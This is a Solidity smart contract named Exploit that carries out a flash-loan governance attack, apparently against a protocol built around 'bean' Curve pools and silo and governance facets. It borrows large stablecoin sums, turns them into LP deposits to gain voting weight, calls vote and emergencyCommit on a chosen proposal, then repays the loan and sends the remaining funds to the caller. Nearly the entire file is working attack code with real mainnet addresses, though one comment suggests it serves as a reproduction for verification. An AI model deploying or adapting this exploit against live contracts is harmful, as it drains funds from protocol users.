//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;

import "./ILendingPool.sol";
import "./ICurvePool.sol";
import "./IERC20.sol";
import "./ISiloV2Facet.sol";
import "./IGovernanceFacet.sol";
import "./TransferHelper.sol";



contract Exploit {
    ILendingPool lendingPool =  ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 threeCrv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    ICurvePool threeCrvPool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurvePool bean3Crv_f = ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    ISiloV2Facet siloV2Facet = ISiloV2Facet(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    IGovernanceFacet govFacet = IGovernanceFacet(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    uint32 bip;

    constructor(){
        dai.approve(address(lendingPool),type(uint256).max);
        usdc.approve(address(lendingPool),type(uint256).max);
        TransferHelper.safeApprove(address(usdt),address(lendingPool),type(uint256).max);
        dai.approve(address(threeCrvPool),type(uint256).max);
        usdc.approve(address(threeCrvPool),type(uint256).max);
        TransferHelper.safeApprove(address(usdt),address(threeCrvPool),type(uint256).max);
        threeCrv.approve(address(bean3Crv_f),type(uint256).max);
        IERC20(address(bean3Crv_f)).approve(address(siloV2Facet),type(uint256).max);
    }
    function attack(uint32 _bip) external {
        bip = _bip;
        address[] memory assets = new address[](3);
        assets[0] = address(dai);
        assets[1] = address(usdc);
        assets[2] = address(usdt);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350000000 * 10**dai.decimals();
        amounts[1] = 500000000 * 10**usdc.decimals();
        amounts[2] = 150000000 * 10**usdt.decimals();
        uint256[] memory modes = new uint256[](3);
        lendingPool.flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);
        usdc.transfer(msg.sender,usdc.balanceOf(address(this)));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool){
        uint256[3] memory tempAmounts;
        tempAmounts[0]=amounts[0];
        tempAmounts[1]=amounts[1];
        tempAmounts[2]=amounts[2];
        threeCrvPool.add_liquidity(tempAmounts,0);
        uint256[2] memory tempAmounts2;
        tempAmounts2[0] = 0;
        tempAmounts2[1] = threeCrv.balanceOf(address(this));
        bean3Crv_f.add_liquidity(tempAmounts2,0);
        siloV2Facet.deposit(address(bean3Crv_f),IERC20(address(bean3Crv_f)).balanceOf(address(this)));
        govFacet.vote(bip);
        govFacet.emergencyCommit(bip);
        bean3Crv_f.remove_liquidity_one_coin(IERC20(address(bean3Crv_f)).balanceOf(address(this)),1,0);
        tempAmounts[0]=amounts[0]+premiums[0];
        tempAmounts[1]=amounts[1]+premiums[1];
        tempAmounts[2]=amounts[2]+premiums[2];
        threeCrvPool.remove_liquidity_imbalance(tempAmounts,type(uint256).max);
        threeCrvPool.remove_liquidity_one_coin(threeCrv.balanceOf(address(this)),1,0);
        return true;
    }

    function sweep() external {
        IERC20 erc20bean3Crv_f = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
        erc20bean3Crv_f.transfer(msg.sender,erc20bean3Crv_f.balanceOf(address(this)));    //Just for verification, so keep other tokens
    }
}